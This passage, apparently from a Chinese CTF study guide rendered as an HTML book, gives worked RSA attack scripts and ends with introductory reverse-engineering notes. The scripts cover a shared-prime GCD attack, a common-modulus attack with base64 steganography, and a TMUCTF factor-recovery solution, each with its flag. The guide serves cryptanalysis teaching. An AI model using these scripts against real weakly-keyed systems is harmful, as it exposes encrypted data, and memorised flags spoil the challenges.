+c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457
+
+n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837
+c15 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842
+
+n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451
+c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724
+
+n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499
+c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024
+
+n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973
+c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887
+
+n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603
+c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889
+
+n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659
+c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346
+
+n = [n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11,
+     n12, n13, n14, n15, n16, n17, n18, n19, n20]
+
+for i in range(len(n)):
+    for j in range(i+1, len(n)):
+        if (gmpy2.gcd(n[i], n[j]) != 1):
+            print(i, j)
+
+e = 65537
+
+p = gmpy2.gcd(n5,n18)
+print(p)
+q = n5 // p
+phi = (p-1)*(q-1)
+d = gmpy2.invert(e, phi)
+
+m = gmpy2.powmod(c5,d,n5)
+print(long_to_bytes(m))
+# b'flag{abdcbe5fd94e23b3de429223ab9c2fdf}'
+</code></pre>
+<h3 id="buuctf-rsa--what"><a class="header" href="#buuctf-rsa--what">BUUCTF RSA &amp; what</a></h3>
+<pre><code class="language-python">import base64
+import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+def common_modulus_attack(c1, c2, e1, e2, n):
+    # 扩展欧几里得算法找到 a 和 b
+    g, a, b = gmpy2.gcdext(e1, e2)
+
+    # 确保 e1 和 e2 互质
+    if g != 1:
+        raise ValueError("e1 和 e2 必须互质")
+
+    # 计算 c1^a 和 c2^b
+    if a &lt; 0:
+        c1 = gmpy2.invert(c1, n)
+        a = -a
+    if b &lt; 0:
+        c2 = gmpy2.invert(c2, n)
+        b = -b
+
+    m1 = gmpy2.powmod(c1, a, n)
+    m2 = gmpy2.powmod(c2, b, n)
+
+    # 恢复消息 m
+    m = (m1 * m2) % n
+    return m
+
+
+n = 785095419718268286866508214304816985447077293766819398728046411166917810820484759314291028976498223661229395009474063173705162627037610993539617751905443039278227583504604808251931083818909467613277587874545761074364427549966555519371913859875313577282243053150056274667798049694695703660313532933165449312949725581708965417273055582216295994587600975970124811496270080896977076946000102701030260990598181466447208054713391526313700681341093922240317428173599031624125155188216489476825606191521182034969120343287691181300399683515414809262700457525876691808180257730351707673660380698973884642306898810000633684878715402823143549139850732982897459698089649561190746850698130299458080255582312696873149210028240898137822888492559957665067936573356367589784593119016624072433872744537432005911668494455733330689385141214653091888017782049043434862620306783436169856564175929871100669913438980899219579329897753233450934770193915434791427728636586218049874617231705308003720066269312729135764175698611068808404054125581540114956463603240222497919384691718744014002554201602395969312999994159599536026359879060218056496345745457493919771337601177449899066579857630036350871090452649830775029695488575574985078428560054253180863725364147
+e1 = 1697
+e2 = 599
+
+c1 = []
+c2 = []
+
+with open('HUB1') as f:
+    for line in f.readlines():
+        c1.append(line.strip())
+
+with open('HUB2') as f:
+    for line in f.readlines():
+        c2.append(line.strip())
+
+
+m = b''
+for c_1, c_2 in zip(c1,c2):
+    m += long_to_bytes(common_modulus_attack(int(c_1), int(c_2), e1, e2, n))
+
+# Base64隐写
+base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+bin_str = ''
+for line in m.split(b'\n'):
+    stegb64 = str(line, 'utf-8').strip('\n')
+    rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), 'utf-8').strip('\n')
+    offset = abs(base64chars.index(stegb64.replace('=', '')[-1]) - base64chars.index(rowb64.replace('=', '')[-1]))
+
+    equalnum = stegb64.count('=')  # no equalnum no offset
+    if equalnum:
+        bin_str += bin(offset)[2:].zfill(equalnum * 2)
+    res = [chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)]
+
+flag = ''.join(res)
+print(flag)
+
+# 7c86d8f7d6de33a87f7f9d6b005ce640
+</code></pre>
+<h2 id="参考资料-3"><a class="header" href="#参考资料-3">参考资料</a></h2>
+<ul>
+<li><a href="https://github.com/RsaCtfTool/RsaCtfTool">https://github.com/RsaCtfTool/RsaCtfTool</a></li>
+<li><a href="https://www.freebuf.com/vuls/257835.html">https://www.freebuf.com/vuls/257835.html</a></li>
+<li><a href="https://forum.butian.net/share/478">https://forum.butian.net/share/478</a></li>
+<li><a href="https://xz.aliyun.com/t/2446">https://xz.aliyun.com/t/2446</a></li>
+<li><a href="https://www.anquanke.com/post/id/217151#h2-9">https://www.anquanke.com/post/id/217151#h2-9</a></li>
+</ul>
+<!--
+强网杯2018 - nextrsa
+
+https://rootfs.eu/codeblue2017-common-modulus/
+https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/0xL4ugh-CTF-2024/chall2.py
+
+todo:
+Rabin Cryptosystem:
+https://ctftime.org/writeup/25857
+
+https://sakibulalikhan.medium.com/backdoorctf-2023-mini-rsa-challenge-writeup-937984bd1e58
+
+https://duksctf.github.io/2019/04/13/PlaidCTF2019-rusad.html
+https://blog.cryptohack.org/cryptoctf2020
+-->
+<p>TMUCTF 2021</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from functools import reduce
+
+
+def encrypt(msg, n):
+    enc = pow(bytes_to_long(msg), e, n)
+    return enc
+
+
+e = 65537
+
+primes = [getPrime(2048) for i in range(5)]
+n = reduce(lambda a, x: a * x, primes, 1)
+print(n)
+
+x1 = primes[1] ** 2
+x2 = primes[2] ** 2
+x3 = primes[1] * primes[2]
+y1 = x1 * primes[2] + x2 * primes[1]
+y2 = x2 * (primes[3] + 1) - 1
+y3 = x3 * (primes[3] + 1) - 1
+print(x2 + x3 + y1)
+print(y2 + y3)
+
+with open('flag', 'rb') as f:
+    flag = f.read()
+    print(encrypt(flag, n))
+</code></pre>
+<p>\[\begin{align}
+n &amp;= p_1 \cdot p_2 \cdot p_3 \cdot p_4 \cdot p_5 \</p>
+<p>x_2 + x_3 + y_1 &amp;= p_2^2 + p_1p_2 + p_1^2p_2 + p_2^2p_1 = p_2(p_1+p_2)(p_1+1) = h_1 \</p>
+<p>\therefore p_2 &amp;= \gcd(n,h_1)</p>
+<p>\end{align}\]</p>
+<p>\( n \)和$x_2 + x_3 + y_1 \)有公约数\( p_2 \)，进而通过解一元二次方程可求\( p_1 \)</p>
+<p>\[
+p_1^2p_2 + (p_2^2 + p_2)p_1 + (p_2 - h_1) = 0 \
+\]</p>
+<p>\[
+\therefore p_1 = \frac{-(p_2^2 + p_2) \pm \sqrt{(p_2^2 + p_2)^2 - 4p_2(p_2 - h_1)}}{2p_2}
+\]</p>
+<p>求\( p_3 \)</p>
+<p>\[
+\begin{align*}
+y_2 + y_3 &amp;= p_2^2 \cdot (p_3 + 1) - 1 + p_1p_2 \cdot (p_3 + 1) - 1 = (p_3 + 1)(p_2^2 + p_1p_2) = h_2 \
+h_2 + 2 &amp;= (p_3 + 1) \cdot (p_2^2 + p_1 \cdot p_2) \
+p_3 &amp;= \frac{(h_2 + 2)}{(p_2^2 + p_1 \cdot p_2)} - 1
+\end{align*}
+\]</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import gmpy2
+from Crypto.Util.number import *
+
+n = 2870378965838324591930716372043943202857808446139955114178972466357197191646555386310681233993639582571871810351336802365212612829432807326876330070965674249357286034347008657883629500396346167749508691814871533203247809103597516756034759095100637453841622270471713637175966387708675681650825362129940918643196769504213592200456774778948694877618977617011530883570013644245183319361244368215398610979149060320165814554577615652211730789657513270358973557241707978338139984414979470166202562114202380919071164176972055791789476453657467515306951139381362369978138151345609568127199377878026652554062731521632501476705069316208464363846111869669167682507916421047852441782552255491492824812854004513204360809331798274954243569021433963906972169417423418831314860109084130511234616069241809687828168649890352090249712449906176079861456197001597695071378819897916782564243557316380779536239285819430145429214343617897807321057453881231873109668847371444981597545948164776111805671836878974593063507806022594658899187647227705150195530817678931698098259376629125579883657290675365061062988342506737677539253213873486072882314916722654639439974767729667348308089822272618812141734747518190918131475394008358752485820114352585363697943409142405397187811488425763607870435598703473283558863875082511735753198985761770194691897333996772347209579690094484306582887604607085834235579991339081114877411129747659636913741732353593602493602935647498099959376575507080043282822039059772712513621914435714472997174303938650778721067511657786410145042462581432379653230157438512241441297394613009093982995995721488753402291657942043365728675978004538612865075473060797997060824242663659400972803009150895091065010288979279208343727383126907536910816233381252213949988179391769784859432462536001028414576853626404313552019318821609411415846740546897494827049963081729773556670009694396655902808674253954003664489541274216766985514320658655385155404804471285629385163182065527325960787883285164384400671878810956747078706832300082761043350763868511932582950753204256098035119847645083342729287063167616495769840389702639642784779646124394274187760742667519368210034941587941073935227051959905320338654629277413407444919186684576561532634097854731829455621571431402040561443044139818425476711378475625762558700335148767065032908314020963523681108498054768101383636397920349166462138683843364568104852099786972138269207828354678771871957631305996408564918629611147162610100969994085549017653854895147761379806516965159036735885697873629236958604838297316909096866364056640064200671318939446575088736134834054178902097259981395846912668763412552618135586399374878369079393695944896480784503275721233694160817424918386850099538763638119036532611566641652505437494379272489263685110137046574303306123483008690943610001403933721637756187395490525025216826398321326468190996213618276820580272764947465497924136451423383678199000687060571477421196675667167891260178408652655959836575935636974063946514718181746525031519883430143656783652516536859306736796341726896446635046579279623124614077795247335483809777
+h1 = 12189833951051730908370223331850919218243946952509718500560332838832804241963905158328421240593088009803147267463017892895712859666255758374859924227795693977692365712139787589267299790301022569583587926463070427550028215313969101326713297706315888193599192042874908901003626554054277955414415385731879026734954423731345798786722561845058120971545040892322209486011914785265062492920550158388814114563652053556586072198675716423094480300266767587890740892336081818352390563087579428787330255230317293748493589325405374600751428190100372051406745392483110379355174892921101536441200795867134576643519454074015675127266952070892796128379921598800605300182483946129377809823776730697790309647647190307296418381398693697240748290194721934318854836676911877413259621512269954316351093519057413607079769428640924051837599266617014518297183874986708528679104069884291849234025193207298171674607085234765320663128701647504631036578515249726222498212335082588627266250272379931767054363936707282364911659508871646177814796817889070190457673852047527357122774587607849820636184925240369923701314690600711989307878295308586902537853388274176578719581752448488589031302166298788451585838083076238353895213222535414766363665801955518856592943846521495707362179018672726109435436743723238172556767198562368516144637629110267835795311939660130673691902395560229758574266655957155862216872908603510940031334166746559195296408939506394470132257044581183533463281253397503463926598923844457702097679565967501579961386522021817780961888842972793029114864422478835769322906292819387383748603289494044561725080616097794190650081867485792883883943744138857860775053197775476414639386004107927910470986208356664914803636501181816689051948285860692212458532201937837589900582214489550639269506433713180672869129866286880957012266595540883727015907677897402607614096813204000
+h2 = 10685466258462426438601930063854796559353071021872734112422666943995273083147678402485604005469990666166510724614508657976179169486278649913444601773228981194010779012945440827279478889951033722845969569487499109114807920422465585370352647531485228491726069752258604141544095143726497561287074963919306162501333879324320431815063767836881722714585596416818455332140968159290951800146179728839649549885714902391429304093259377977040947324691472037003260741076844850530123289350979761389302226559515709663477520315215796685387805223395013156063533568746725754875786890572455450963004254041206457627272694223378868063657567852741748730175173641019445706089775572094353061394171203735646557579595881047090069929263278434116703002648581646489410683234908239597741887334283851760107425225954878508549100715448112116790430791154066542690753466803004681805878269979001221299212426591974298670638899337600244969172572955344326969720268282445856163235666525453179028071857247486445419793906307197739042430106158187925914823345884448535360673122213977744765084269696399126350806729338388901052234851028732099724640679744428962810579433414095277730427540297789173682400086721025827804724736734372677509987948167038979141434755652392244734118982644329505761227780128318076798321983092557417882569724665849318066642854479540185619304472196160849810402529549850401440730174222018187759986936759639741288629098555521157461858554745777119186003733147607872641752914478401134544544581877108606144844955497062864711396338329584713840695858914573229254445387595034317081334732222156791041901660170883047145528155203729023944309061959449827690809614300474069217485344927501901373264278607167662413547572497683805087479857076246143962932587232903893219862365333270757997373558132982228573327073639550742090562057353483860863787775987229835303262050707215194078693398663198
+c = 1295564702637495685309272079895645034267002212576577351176786924725825901033456751565363132227845395192636014504044948379030468685845611242265523726539023437126669783303765124723915472786629678436713048730755297486348344599742142845784560313837239832937917360379066282667491918054529416764918515780567145928364634646722930481542026187360739697820492335622597715014255829089436910724972509085963133800806856075152036053630879580926838241308921405124424958500485001162000846198656477271924822124768722799190195854806533587717469450248664509344104461703840455934612539385694033634268205463024167234754553081069919678171898669570723347606172526826003367647892759191360901723076962059024693433937573808414595918813154817183122218324304727720231993955442001953029300266308755291774280607633683770298830407751731984235360718897231362141728129903067324174378760053260419744395257753779565716943029464080442902252184316484343234160161564121269883788523966796266675498603214422442299610994620373055814615356464754724264668947373104292350153322562799134518201535870142301501474217531998628211638040128486684200215958700680344308113382908656637378359217107811764695801417920230331446471475336055801665419851805385433677261916024902543165187462517860936690178095112472342793009281361928879367602088695738746822374043544415398979893735410561210643701354068887205774369902436302903034048756740583183966251194450689131063910079690811851244607443172434856486129471747053074648343069627212505795579741010868965206480675568896896528625130571758075102146302306655426190892962618128161759734724982773347245232038629926619247273436934947196867813659364951484832193239178102156204300353342841972762595259292048840326449938071520689839586933982775979336248771535685895403976612898604059800532915376510948151614460338199157528220842025853852584958511622657382701623309639101678362821929006062524756352592131742510350318470015268920615837821556797760508924258618057921324240995910743034414956163701330735308503014893515707188853735706296571253748889626515245648558769422283608966241496382223293119306642490794180175154686106323945765280777140420938641267467633112805720348438191023736935327334544026698324629536721807051447503613438954736205208639453193587326470160505597834244792859179593877840449441035962707113092034561698560285482507381177956117498938436596192528337690808299050972992206796450167499247505347105318901580848542927515381051973057219542622235114029773502036331075236848879130640275120244541018979621405480997745366565533911987665660584132852855158311718515145400486762846976972483867689062569575052791463761762637757579908921446285546575036947648139847182684615282524513693899858284291993167395096893612172061860682116974864364966362118833708791957224527084022917788839602167742342150067548893185747653708657029597051779997866982601553339504636518951723213334104705177572536156329378433835224612846933662252315126902599937489337158843870992464520248466088492159756466651557918397098886626028193224320040156124777562920457488126430654110240828124538167742484933802988652725530546987842196376
+e = 65537
+
+p2 = gmpy2.gcd(h1, n)
+p22 = p2**2
+p1 = (-(p22+p2) + gmpy2.isqrt((p22+p2)**2 - 4*p2*(p22-h1))) // (2*p2)
+p3 = (h2+2)//(p22 + p1*p2) - 1
+
+assert all(isPrime(p) for p in [p1,p2,p3])
+
+N = p1*p2*p3
+phi = (p1-1)*(p2-1)*(p3-1)
+d = gmpy2.invert(e, phi)
+m = gmpy2.powmod(c,d,N)
+print(long_to_bytes(m))
+
+# TMUCTF{Y35!!!__M4Y_N0t_4lW4y5_N33d_4ll_p21M3_f4c70R5}
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="逆向工程"><a class="header" href="#逆向工程">逆向工程</a></h1>
+<h2 id="进制转换"><a class="header" href="#进制转换">进制转换</a></h2>
+<h2 id="字节序"><a class="header" href="#字节序">字节序</a></h2>
+<p>字节序是指在计算机中存储多字节数据时，字节的顺序。主要有两种字节序：</p>
+<ul>
+<li><strong>大端字节序（Big-endian）</strong>：高位字节存储在低地址，低位字节存储在高地址。</li>
+<li><strong>小端字节序（Little-endian）</strong>：低位字节存储在低地址，高位字节存储在高地址。</li>
+</ul>
+<p>例如，一个值为 <code>0x0A0B0C0D</code> 的整型数，采用小端序和大端序时在内存中的存储情况如下图所示。</p>
+<p><img src="reverse/../images/Endianness-example.png" alt="字节序" /></p>
+<p>x86 的 CPU 使用小端序。</p>
+<p><a href="https://getiot.tech/computerbasics/endianness/">https://getiot.tech/computerbasics/endianness/</a></p>
+<p><a href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html</a></p>
+<pre><code class="language-bash"></code></pre>
+<p><a href="https://xiaolincoding.com/os/1_hardware/how_cpu_run.html">https://xiaolincoding.com/os/1_hardware/how_cpu_run.html</a></p>
+<p><img src="reverse/../images/Compiler_scheme.png" alt="Compiler_scheme" /></p>
+<h2 id="反汇编"><a class="header" href="#反汇编">反汇编</a></h2>
+<h2 id="反编译"><a class="header" href="#反编译">反编译</a></h2>
+<h2 id="寄存器"><a class="header" href="#寄存器">寄存器</a></h2>
+<p>寄存器（register）是CPU内部用于暂存指令、数据和地址的存储器。</p>
+<p>常见的寄存器种类：</p>
+<ul>
+<li>通用寄存器，用来存放需要进行运算的数据，比如需要进行加和运算的两个数据。</li>
+<li>程序计数器，用来存储 CPU 要执行下一条指令「所在的内存地址」，注意不是存储了下一条要执行的指令，此时指令还在内存中，程序计数器只是存储了下一条指令「的地址」。</li>
+<li>指令寄存器，用来存放当前正在执行的指令，也就是指令本身，指令被执行完成之前，指令都存储在这里。
+段寄存器？</li>
+</ul>
+<p>物理地址？逻辑地址？</p>
+<p>现代（即386及以后）x86 处理器具有八个32位通用寄存器。32 位寄存器是以<code>E</code>开头，<code>E</code>代表扩展（extended）。</p>
+<p><img src="reverse/../images/x86-registers.png" alt="x86寄存器" /></p>
+<p>寄存器的名称承载着其历史和用途</p>
+<ul>
+<li>EAX，累加器（Accumulator），最初被设计为执行算术运算和数据操作的主要寄存器。</li>
+<li>EBX，基址寄存器（Base Register），指向数据段（DS段）中的数据。用于存储程序的基址。</li>
+<li>ECX, 计数器（Counter），最初用于循环和迭代操作，特别是在处理循环时，ECX被用来保持循环的计数器。</li>
+<li>EDX， 数据寄存器（Data Register），最初被设计来存储数据操作期间的附加数据，通常用于扩展特定运算（如乘法和除法）。</li>
+<li>ESI, 源索引寄存器（Source Index Register）</li>
+<li>EDI，目的索引寄存器（Destination Index Register）</li>
+</ul>
+<p>但按照惯例，有两个寄存器保留为特殊用途，即栈指针（ESP）和基址指针（EBP）。</p>
+<ul>
+<li>ESP 栈指针（Stack Pointer）,始终指向当前栈顶的位置。在函数调用和返回、局部变量存储时，ESP 的值会发生变化。</li>
+<li>EBP 基址指针（Base Pointer）,通常用于指向当前函数的栈帧基址。它维护了一种稳定的方式来访问局部变量和函数参数。</li>
+</ul>
+<p>请注意，上述每个寄存器都是32位或4字节长。EAX、EBX、ECX和EDX寄存器的低2字节可以通过AX进行引用，并可进一步细分为高字节（AH、BH、CH和DH）和低字节（AL、BL、CL和DL），每个字节长度为1字节。</p>
+<p>此外，ESI、EDI、EBP和ESP也可以通过它们的16位等效寄存器SI、DI、BP和SP进行引用。</p>
+<p>段寄存器</p>
+<p>共有六个段寄存器，如下所示：</p>
+<p>CS：代码段寄存器，用于存储代码段（.text段）的基址，供数据访问使用。</p>
+<p>DS：数据段寄存器，存储变量的默认位置（.data段），供数据访问使用。</p>
+<p>ES：额外段寄存器，在字符串操作过程中使用。</p>
+<p>SS：堆栈段寄存器，存储堆栈段的基址，当隐式使用堆栈指针或显式使用基址指针时使用。</p>
+<p>FS：额外段寄存器。</p>
+<p>GS：额外段寄存器。</p>
+<p>标志寄存器</p>
+<p>IDA 界面 快捷键</p>
+<p>IDA插件</p>
+<p>GDB
+调试</p>
+<p>静态链接、动态链接</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main()
+{
+   printf("Hello, World!");
+   return 0;
+}
+</code></pre>
+<p>magic</p>
+<p>栈溢出</p>
+<p>exeinfo</p>
+<p>静态分析
+动态分析</p>
+<ul>
+<li>ida，windows、linux</li>
+<li>pwndbg</li>
+</ul>
+<p>迷宫问题</p>
+<p>栈溢出</p>
+<p>gdb =&gt; pwndbg</p>
+<h2 id="内存布局"><a class="header" href="#内存布局">内存布局</a></h2>
+<p><img src="reverse/../images/program_in_memory.png" alt="" /></p>
+<ul>
+<li>每个进程在多任务操作系统中运行在独立的虚拟地址空间，32位系统的虚拟地址空间总是4GB。</li>
+<li>程序的代码段（Text）包含可执行指令，通常是只读的，防止程序修改其指令。</li>
+<li>数据段包含全局和静态变量，其内容可以在运行时改变，但可以分为只读和可写区域。</li>
+<li>BSS段存储所有未初始化的全局和静态变量，操作系统会在执行前将其初始化为0。</li>
+<li>栈区用于存储函数调用的数据，以LIFO结构管理函数的局部变量和返回地址。</li>
+<li>堆区用于动态内存分配，处理程序在运行时请求的内存，通常由malloc和free等函数管理。</li>
+</ul>
+<p><a href="https://x64dbg.com/">x64dbg</a> 是一款免费且开源的调试器，支持32位和64位Windows应用程序的调试。</p>
+<h2 id="ida"><a class="header" href="#ida">IDA</a></h2>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="theme/pagetoc.js"></script>
+
+        <script>
+        window.addEventListener('load', function() {
+            MathJax.Hub.Register.StartupHook('End', function() {
+                window.setTimeout(window.print, 100);
+            });
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
